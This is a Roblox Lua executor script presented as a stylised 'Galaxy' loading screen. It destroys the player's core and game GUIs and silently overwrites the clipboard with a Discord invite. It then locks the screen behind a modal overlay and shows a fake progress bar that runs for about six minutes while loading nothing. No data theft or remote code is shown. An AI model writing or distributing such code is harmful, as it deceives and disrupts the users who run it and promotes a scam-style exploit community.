local allowedPlaceIds = {920587237, 126884695634066}

for _, v in ipairs(game:GetService("CoreGui"):GetChildren()) do
    if v.Name ~= "RobloxPromptGui" and v.Name ~= "RobloxGui" then
        v:Destroy()
    end
end

if not table.find(allowedPlaceIds, game.PlaceId) then
    for _, gui in ipairs(game.Players.LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
        gui:Destroy()
    end
end

setclipboard("discord.gg/PebjxmePmd")

task.spawn(function()
    local TweenService = game:GetService("TweenService")
    local RunService = game:GetService("RunService")
    local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local screengui = Instance.new("ScreenGui")
    screengui.Name = "GalaxyLoadingScreen"
    screengui.IgnoreGuiInset = true
    screengui.ResetOnSpawn = false
    screengui.DisplayOrder = 999999
    screengui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screengui.Parent = PlayerGui

    local blocker = Instance.new("TextButton")
    blocker.Size = UDim2.new(1, 0, 1, 0)
    blocker.Position = UDim2.new(0, 0, 0, 0)
    blocker.BackgroundTransparency = 1
    blocker.Text = ""
    blocker.AutoButtonColor = false
    blocker.Modal = true
    blocker.ZIndex = math.huge
    blocker.Parent = screengui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BorderSizePixel = 0
    bg.ZIndex = math.huge - 100
    bg.Parent = screengui

    local bgGradient = Instance.new("UIGradient")
    bgGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
    }
    bgGradient.Parent = bg

    local nebula = Instance.new("ImageLabel")
    nebula.Size = UDim2.new(2, 0, 2, 0)
    nebula.AnchorPoint = Vector2.new(0.5, 0.5)
    nebula.Position = UDim2.new(0.5, 0, 0.5, 0)
    nebula.BackgroundTransparency = 1
    nebula.Image = "rbxassetid://10957039936"
    nebula.ImageColor3 = Color3.fromRGB(150, 0, 0)
    nebula.ImageTransparency = 0.75
    nebula.ZIndex = math.huge - 99
    nebula.Parent = bg

    local particleFrame = Instance.new("Frame")
    particleFrame.Size = UDim2.new(1, 0, 1, 0)
    particleFrame.BackgroundTransparency = 1
    particleFrame.ClipsDescendants = true
    particleFrame.ZIndex = math.huge - 98
    particleFrame.Parent = bg

    local particles = {}
    for i = 1, 160 do
        local p = Instance.new("Frame")
        local size = math.random(1, 3)
        p.Size = UDim2.new(0, size, 0, size)
        p.Position = UDim2.new(math.random(), 0, math.random(), 0)
        p.BackgroundColor3 = Color3.fromRGB(math.random(180, 255), math.random(0, 60), math.random(0, 30))
        p.BackgroundTransparency = math.random(3, 7) / 10
        p.BorderSizePixel = 0
        p.ZIndex = math.huge - 97
        p.Parent = particleFrame
        particles[#particles+1] = {p = p, speed = Vector2.new((math.random() - 0.5) * 0.05, (math.random() - 0.5) * 0.05)}
    end

    local labelShadow = Instance.new("TextLabel")
    labelShadow.Size = UDim2.new(1, 0, 0, 80)
    labelShadow.AnchorPoint = Vector2.new(0.5, 0.5)
    labelShadow.Position = UDim2.new(0.5, 3, 0.4, 3)
    labelShadow.BackgroundTransparency = 1
    labelShadow.Text = "Loading... 0%"
    labelShadow.TextScaled = true
    labelShadow.Font = Enum.Font.FredokaOne
    labelShadow.TextColor3 = Color3.fromRGB(30, 0, 0)
    labelShadow.TextTransparency = 0.3
    labelShadow.ZIndex = math.huge - 96
    labelShadow.Parent = bg

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 80)
    label.AnchorPoint = Vector2.new(0.5, 0.5)
    label.Position = UDim2.new(0.5, 0, 0.4, 0)
    label.BackgroundTransparency = 1
    label.Text = "Loading... 0%"
    label.TextScaled = true
    label.Font = Enum.Font.FredokaOne
    label.TextColor3 = Color3.fromRGB(255, 60, 60)
    label.ZIndex = math.huge - 95
    label.Parent = bg

    local labelGradient = Instance.new("UIGradient")
    labelGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 60, 60)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 0, 0))
    }
    labelGradient.Parent = label

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.6, 0, 0.04, 0)
    barBg.AnchorPoint = Vector2.new(0.5, 0.5)
    barBg.Position = UDim2.new(0.5, 0, 0.55, 0)
    barBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    barBg.BorderSizePixel = 0
    barBg.ZIndex = math.huge - 94
    barBg.Parent = bg
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 15)

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    fill.BorderSizePixel = 0
    fill.ZIndex = math.huge - 93
    fill.Parent = barBg
    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 15)

    local fillGradient = Instance.new("UIGradient")
    fillGradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 70, 70)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 0))
    }
    fillGradient.Parent = fill

    local discordButton = Instance.new("TextButton")
    discordButton.Size = UDim2.new(0.4, 0, 0, 40)
    discordButton.AnchorPoint = Vector2.new(0.5, 0)
    discordButton.Position = UDim2.new(0.5, 0, 0.63, 0)
    discordButton.BackgroundColor3 = Color3.fromRGB(40, 60, 60)
    discordButton.AutoButtonColor = true
    discordButton.TextColor3 = Color3.fromRGB(255, 60, 60)
    discordButton.TextScaled = true
    discordButton.Font = Enum.Font.FredokaOne
    discordButton.Text = "Copy Discord Link"
    discordButton.ZIndex = math.huge - 92
    discordButton.Parent = bg
    Instance.new("UICorner", discordButton).CornerRadius = UDim.new(0, 12)

    local discordGradient = Instance.new("UIGradient")
    discordGradient.Color = labelGradient.Color
    discordGradient.Parent = discordButton

    local glow = Instance.new("ImageLabel")
    glow.Parent = discordButton
    glow.BackgroundTransparency = 1
    glow.AnchorPoint = Vector2.new(0.5, 0.5)
    glow.Position = UDim2.new(0.5, 0, 0.5, 0)
    glow.Size = UDim2.new(2.8, 0, 6, 0)
    glow.Image = "rbxassetid://4999275446"
    glow.ImageTransparency = 1
    glow.ImageColor3 = Color3.fromRGB(0, 255, 100)
    glow.ZIndex = discordButton.ZIndex - 1

    discordButton.MouseButton1Click:Connect(function()
        setclipboard("discord.gg/PebjxmePmd")
        task.spawn(function()
            local ts = game:GetService("TweenService")
            ts:Create(discordButton, TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                {Size = UDim2.new(0.4, 0, 0, 36), BackgroundColor3 = Color3.fromRGB(60, 100, 80)}
            ):Play()
            ts:Create(glow, TweenInfo.new(0.20, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {ImageTransparency = 0.1, Size = UDim2.new(3.5, 0, 8, 0)}
            ):Play()
            task.wait(0.22)
            ts:Create(discordButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {Size = UDim2.new(0.4, 0, 0, 40), BackgroundColor3 = Color3.fromRGB(40, 60, 60)}
            ):Play()
            ts:Create(glow, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {ImageTransparency = 1, Size = UDim2.new(2.8, 0, 6, 0)}
            ):Play()
        end)
    end)

    local t = 0
    RunService.RenderStepped:Connect(function(dt)
        t += dt
        bgGradient.Rotation = (bgGradient.Rotation + dt * 8) % 360
        fillGradient.Rotation = (fillGradient.Rotation + dt * 90) % 360
        labelGradient.Rotation = (labelGradient.Rotation + dt * 50) % 360
        discordGradient.Rotation = (discordGradient.Rotation + dt * 50) % 360
        nebula.Rotation = (nebula.Rotation + dt * 3) % 360
        nebula.Position = UDim2.new(0.5 + math.sin(t * 0.3) * 0.05, 0, 0.5 + math.cos(t * 0.4) * 0.05, 0)
        local pulse = (math.sin(t * 1.5) + 1) / 2
        label.TextColor3 = Color3.fromRGB(180 + 60 * pulse, 40, 40)
        for _, v in ipairs(particles) do
            local p = v.p
            local pos = p.Position
            local newX = (pos.X.Scale + v.speed.X * dt) % 1
            local newY = (pos.Y.Scale + v.speed.Y * dt) % 1
            p.Position = UDim2.new(newX, 0, newY, 0)
        end
    end)

    task.spawn(function()
        for i = 0, 100 do
            label.Text = string.format("Loading... %d%%", i)
            labelShadow.Text = label.Text
            TweenService:Create(fill, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {Size = UDim2.new(i / 100, 0, 1, 0)}
            ):Play()
            task.wait(3.6)
        end

        local fade = TweenInfo.new(1)
        TweenService:Create(bg, fade, {BackgroundTransparency = 1}):Play()
        TweenService:Create(label, fade, {TextTransparency = 1}):Play()
        TweenService:Create(labelShadow, fade, {TextTransparency = 1}):Play()
        TweenService:Create(barBg, fade, {BackgroundTransparency = 1}):Play()
        TweenService:Create(fill, fade, {BackgroundTransparency = 1}):Play()
        TweenService:Create(discordButton, fade, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        screengui:Destroy()
    end)
end)
